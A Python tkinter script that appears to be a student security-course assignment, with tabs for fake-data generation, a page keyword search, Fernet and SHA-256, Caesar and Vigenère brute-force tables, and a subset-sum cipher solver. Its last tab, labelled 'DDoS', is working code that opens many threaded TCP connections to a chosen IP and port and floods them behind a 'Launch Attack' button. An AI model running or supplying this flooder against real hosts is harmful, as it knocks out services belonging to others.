import tkinter as tk
from tkinter import ttk, scrolledtext
import requests
from faker import Faker
from cryptography.fernet import Fernet
import hashlib
import socket
import threading


#Global variables
ddos_running = False

# === Core Logic Functions ===

# Question 1: Faker
def generate_fake_data(locale, num_entries):
    fake_localized = Faker(locale)
    output = f"--- Generating Fake Data for Locale: {locale} ---\n"
    for _ in range(num_entries):
        output += str({
            'Name': fake_localized.name(),
            'Address': fake_localized.address().replace('\n', ', '),
            'Email': fake_localized.email()
        }) + "\n"
    return output

# Question 2: Requests
def search_keyword_in_source(url, keyword):
    try:
        response = requests.get(url)
        response.raise_for_status()
        source_code = response.text
        positions = [i for i in range(len(source_code)) if source_code.startswith(keyword, i)]
        result = f"---- Source Code (first 500 chars) ----\n{source_code}...\n---------------------\n"
        if positions:
            result += f"The keyword '{keyword}' was found at positions: {positions}"
        else:
            result += f"The keyword '{keyword}' was NOT found."
        return result
    except Exception as e:
        return f"An error occurred: {e}"

# Question 3: Encryption
def encrypt_message(message, method):
    if method.lower() == 'fernet':
        key = Fernet.generate_key()
        cipher = Fernet(key)
        encrypted = cipher.encrypt(message.encode())
        return f"Key: {key.decode()}\nEncrypted: {encrypted.decode()}"
    elif method.lower() == 'sha256':
        return hashlib.sha256(message.encode()).hexdigest()
    else:
        return "Invalid method"

# Question 4: Caesar Cipher
def caesar_shift(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            shift_base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - shift_base - shift) % 26 + shift_base)
        else:
            result += char
    return result

def caesar_shift_table(encrypted_text):
    output = "Decryption Shift | Candidate plaintext\n--------------------------------------\n"
    for shift in range(26):
        output += f"{shift:<16}| {caesar_shift(encrypted_text, shift)}\n"
    return output

# Question 5: Vigenère Cipher
def generate_shift_table(ciphertext):
    keys, jumps = range(26), range(26)
    shift_table = []
    for key in keys:
        for jump in jumps:
            result = ""
            for i in range(len(ciphertext)):
                c = ciphertext[i]
                if c.isupper():
                    result += chr((ord(c) - key - jump * i - 65) % 26 + 65)
                elif c.islower():
                    result += chr((ord(c) - key - jump * i - 97) % 26 + 97)
                else:
                    result += c
            shift_table.append((key, jump, result))
    return shift_table

# Question 6: MSSP Decrypt
def findSubsetSum(nums, i, target_sum, current_subset):
    if target_sum == 0:
        return current_subset
    if i >= len(nums):
        return None
    with_current = findSubsetSum(nums, i + 1, target_sum - nums[i], current_subset + [nums[i]])
    if with_current:
        return with_current
    return findSubsetSum(nums, i + 1, target_sum, current_subset)

def extractGroups(cypherText, n, m, d):
    numbers = [int(cypherText[i:i + d]) for i in range(0, len(cypherText), d)]
    if len(numbers) != n * m:
        raise ValueError("Cypher text does not match expected structure.")
    return [numbers[i * m:(i + 1) * m] for i in range(n)]

def getAllSubsetSums(nums):
    result = set()
    def dfs(i, current_sum):
        if i == len(nums): return
        result.add(current_sum + nums[i])
        dfs(i + 1, current_sum + nums[i])
        dfs(i + 1, current_sum)
    dfs(0, 0)
    return result

def decryptMSSP(cypherText, n, m, d):
    groups = extractGroups(cypherText, n, m, d)
    possible_sums = getAllSubsetSums(groups[0])
    for s in sorted(possible_sums):
        all_subsets = []
        match = True
        for g in groups:
            subset = findSubsetSum(g, 0, s, [])
            if subset:
                all_subsets.append((g, subset))
            else:
                match = False
                break
        if match:
            result = f"Decryption successful! Plaintext sum: {s}\n"
            for idx, (group, subset) in enumerate(all_subsets):
                result += f"Group {idx + 1}: {group} -> Subset found: {subset}\n"
            return result
    return "No common subset sum found."

# Question 7: DDoS
def attack_target(ip, port, message, thread_id):
    global ddos_running
    ddos_running = True
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        msg = f"Thread-{thread_id}: {message}".encode()
        while ddos_running:
            sock.sendall(msg)
            response = sock.recv(4096)
            print(f"[Thread-{thread_id}] {response.decode(errors='ignore')}")
    except Exception as e:
        print(f"[Thread-{thread_id}] Error: {e}")
    finally:
        sock.close()


# === GUI Setup ===
root = tk.Tk()
root.title("Ben Cohen - 208464487, Ofek Shemesh - 313559601, Ben Zion - 201561420")
notebook = ttk.Notebook(root)
notebook.pack(fill='both', expand=True)

def section_tab(name):
    frame = ttk.Frame(notebook)
    notebook.add(frame, text=name)
    return frame

def add_inputs_and_output(frame, inputs, button_text, command):
    entries = []
    for label in inputs:
        ttk.Label(frame, text=label).pack()
        e = ttk.Entry(frame)
        e.pack(fill='x')
        entries.append(e)
    output = scrolledtext.ScrolledText(frame, height=10)
    output.configure(state='disabled')
    output.pack(fill='both', expand=True)
    def on_click():
        try:
            result = command(*(e.get() for e in entries))
            output.configure(state='normal')
            output.insert(tk.END, str(result) + '\n')
            output.configure(state='disabled')
            output.yview(tk.END)
        except Exception as err:
            output.insert(tk.END, f"Error: {err}\n")
    ttk.Button(frame, text=button_text, command=on_click).pack()
    return entries

# Tabs
faker_tab = section_tab("Faker")

ttk.Label(faker_tab, text="Select Locale:").pack()
locales = ['en_US', 'he_IL', 'ja_JP', 'it_IT']
locale_combo = ttk.Combobox(faker_tab, values=locales, state='readonly')
locale_combo.current(0)
locale_combo.pack(fill='x')

ttk.Label(faker_tab, text="Number of Entries:").pack()
count_entry = ttk.Entry(faker_tab)
count_entry.pack(fill='x')

faker_output = scrolledtext.ScrolledText(faker_tab, height=10)
faker_output.configure(state='disabled')
faker_output.pack(fill='both', expand=True)

def run_faker():
    try:
        result = generate_fake_data(locale_combo.get(), int(count_entry.get()))
        faker_output.configure(state='normal')
        faker_output.insert(tk.END, result + '\n')
        faker_output.configure(state='disabled')
        faker_output.yview(tk.END)
    except Exception as e:
        faker_output.insert(tk.END, f"Error: {e}\n")

ttk.Button(faker_tab, text="Generate", command=run_faker).pack()
add_inputs_and_output(section_tab("Requests"), ["URL", "Keyword"], "Search", search_keyword_in_source)
encrypt_tab = section_tab("Encryption")

ttk.Label(encrypt_tab, text="Message:").pack()
message_entry = ttk.Entry(encrypt_tab)
message_entry.pack(fill='x')

ttk.Label(encrypt_tab, text="Select Method:").pack()
encryption_methods = ['fernet', 'sha256']
method_combo = ttk.Combobox(encrypt_tab, values=encryption_methods, state='readonly')
method_combo.current(0)
method_combo.pack(fill='x')

encrypt_output = scrolledtext.ScrolledText(encrypt_tab, height=10)
encrypt_output.configure(state='disabled')
encrypt_output.pack(fill='both', expand=True)

def run_encryption():
    try:
        result = encrypt_message(message_entry.get(), method_combo.get())
        encrypt_output.configure(state='normal')
        encrypt_output.insert(tk.END, result + '\n')
        encrypt_output.configure(state='disabled')
        encrypt_output.yview(tk.END)
    except Exception as e:
        encrypt_output.insert(tk.END, f"Error: {e}\n")

ttk.Button(encrypt_tab, text="Encrypt", command=run_encryption).pack()

add_inputs_and_output(section_tab("Caesar"), ["Encrypted Text"], "Show Table", caesar_shift_table)

vig_tab = section_tab("Vigenère")
ttk.Label(vig_tab, text="Enter Encrypted Text:").pack()
vig_entry = ttk.Entry(vig_tab)
vig_entry.pack(fill='x')
vig_output = scrolledtext.ScrolledText(vig_tab, height=10)
vig_output.configure(state='disabled')
vig_output.pack(fill='both', expand=True)
def run_vigenere():
    results = generate_shift_table(vig_entry.get())
    vig_output.configure(state='normal')
    for key, jump, text in results:
        vig_output.insert(tk.END, f"Key={key}, Jump={jump} → {text}\n")
    vig_output.configure(state='disabled')
ttk.Button(vig_tab, text="Run", command=run_vigenere).pack()

mssp_tab = section_tab("MSSP")

ttk.Label(mssp_tab, text="CypherText:").pack()
cypher_entry = ttk.Entry(mssp_tab)
cypher_entry.pack(fill='x')

ttk.Label(mssp_tab, text="n:").pack()
n_entry = ttk.Entry(mssp_tab)
n_entry.pack(fill='x')

ttk.Label(mssp_tab, text="m:").pack()
m_entry = ttk.Entry(mssp_tab)
m_entry.pack(fill='x')

ttk.Label(mssp_tab, text="d:").pack()
d_entry = ttk.Entry(mssp_tab)
d_entry.pack(fill='x')

mssp_output = scrolledtext.ScrolledText(mssp_tab, height=10)
mssp_output.pack(fill='both', expand=True)
mssp_output.configure(state='disabled')

def run_mssp():
    try:
        result = decryptMSSP(cypher_entry.get(), int(n_entry.get()), int(m_entry.get()), int(d_entry.get()))
        mssp_output.configure(state='normal')
        mssp_output.insert(tk.END, result + '\n')
        mssp_output.configure(state='disabled')
        mssp_output.yview(tk.END)
    except Exception as e:
        mssp_output.configure(state='normal')
        mssp_output.insert(tk.END, f"Error: {e}\n")
        mssp_output.configure(state='disabled')

ttk.Button(mssp_tab, text="Decrypt MSSP", command=run_mssp).pack()

# DDoS Tab
ddos_tab = section_tab("DDoS")
labels = ["IP", "Port", "Message", "Threads"]
entries = []
for l in labels:
    ttk.Label(ddos_tab, text=l).pack()
    e = ttk.Entry(ddos_tab)
    e.pack(fill='x')
    entries.append(e)
def start_ddos():
    ip, port, msg, count = entries[0].get(), int(entries[1].get()), entries[2].get(), int(entries[3].get())
    for i in range(count):
        threading.Thread(target=attack_target, args=(ip, port, msg, i + 1), daemon=True).start()
ttk.Button(ddos_tab, text="Launch Attack", command=start_ddos).pack()
def stop_ddos():
    global ddos_running
    ddos_running = False

ttk.Button(ddos_tab, text="Stop Attack", command=stop_ddos).pack()


root.mainloop()

